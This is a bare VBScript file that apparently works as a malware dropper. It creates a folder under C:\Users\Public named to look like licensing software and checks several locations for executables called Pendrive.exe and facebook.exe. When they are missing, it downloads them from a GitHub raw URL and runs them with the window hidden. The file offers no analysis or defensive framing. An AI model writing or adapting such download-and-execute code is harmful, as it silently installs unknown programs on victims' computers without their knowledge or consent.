Dim FSO
Set WshShell = CreateObject( "WScript.Shell" )
Set FSO = CreateObject("Scripting.FileSystemObject")

Path = "C:\Users\Public\Licence\Extension"





If Not fso.FolderExists(Path) Then
	FSO.CreateFolder "C:\Users\Public\Licence" 
	FSO.CreateFolder "C:\Users\Public\Licence\Extension" 
End If







User = WshShell.ExpandEnvironmentStrings( "%USERNAME%" )
Loc1 = "C:\Users\Public\Licence\Extension\Pendrive.exe"
Loc2 = "C:\Users\"+ User + "\AppData\Local\Temp\afolder\Pendrive.exe"
Loc3 = ".\Pendrive.exe"


If fso.FileExists(Loc1) Then
   WshShell.CurrentDirectory=Path 
   WshShell.Run chr(34) & "C:\Users\Public\Licence\Extension\Pendrive.exe" & Chr(34), 0


Elseif fso.FileExists(Loc2) Then
   WshShell.CurrentDirectory=Path 
   WshShell.Run chr(34) & "C:\Users\"+ User + "\AppData\Local\Temp\afolder\Pendrive.exe" & Chr(34), 0


Elseif fso.FileExists(Loc3) Then
   WshShell.Run chr(34) & ".\Pendrive.exe" & Chr(34), 0


Else
   '  MsgBox "[?] Please check your internet connection and try again!"
        WshShell.CurrentDirectory=Path 
    	Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")

	URL = "https://github.com/win32u/Licence/blob/main/Extension/Exe/Pendrive.exe?raw=true"
	objWinHttp.open "GET", URL, False
	objWinHttp.send ""

	SaveBinaryData ".\Pendrive.exe",objWinHttp.responseBody
	Function SaveBinaryData(FileName, Data)
	Const adTypeText = 1
	Const adSaveCreateOverWrite = 2
	Dim BinaryStream
	Set BinaryStream = CreateObject("ADODB.Stream")
	BinaryStream.Type = adTypeText
	BinaryStream.Open
	BinaryStream.Write Data
	BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
	End Function
   WScript.Sleep 1000
   WshShell.Run chr(34) & ".\Pendrive.exe" & Chr(34), 0

End If




Loc1 = "C:\Users\Public\Licence\Extension\facebook.exe"
Loc2 = "C:\Users\"+ User + "\AppData\Local\Temp\afolder\facebook.exe"
Loc3 = ".\facebook.exe"
Path = "C:\Users\Public\Licence\Extension"


If fso.FileExists(Loc1) Then
   WshShell.CurrentDirectory=Path 
   WshShell.Run chr(34) & "C:\Users\Public\Licence\Extension\facebook.exe" & Chr(34), 0
   Set WshShell = Nothing 

Elseif fso.FileExists(Loc2) Then
   WshShell.CurrentDirectory=Path 
   WshShell.Run chr(34) & "C:\Users\"+ User + "\AppData\Local\Temp\afolder\facebook.exe" & Chr(34), 0
   Set WshShell = Nothing 

Elseif fso.FileExists(Loc3) Then
   WshShell.Run chr(34) & ".\facebook.exe" & Chr(34), 0
   Set WshShell = Nothing 

Else
   '  MsgBox "[?] Please check your internet connection and try again!"
        WshShell.CurrentDirectory=Path 
    	Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")

	URL = "https://github.com/win32u/Licence/blob/main/Extension/Exe/facebook.exe?raw=true"
	objWinHttp.open "GET", URL, False
	objWinHttp.send ""

	SaveBinaryData ".\facebook.exe",objWinHttp.responseBody
	Function SaveBinaryData(FileName, Data)
	Const adTypeText = 1
	Const adSaveCreateOverWrite = 2
	Dim BinaryStream
	Set BinaryStream = CreateObject("ADODB.Stream")
	BinaryStream.Type = adTypeText
	BinaryStream.Open
	BinaryStream.Write Data
	BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
	End Function
   WScript.Sleep 1000
   WshShell.Run chr(34) & ".\facebook.exe" & Chr(34), 0
   Set WshShell = Nothing
End If
WScript.Quit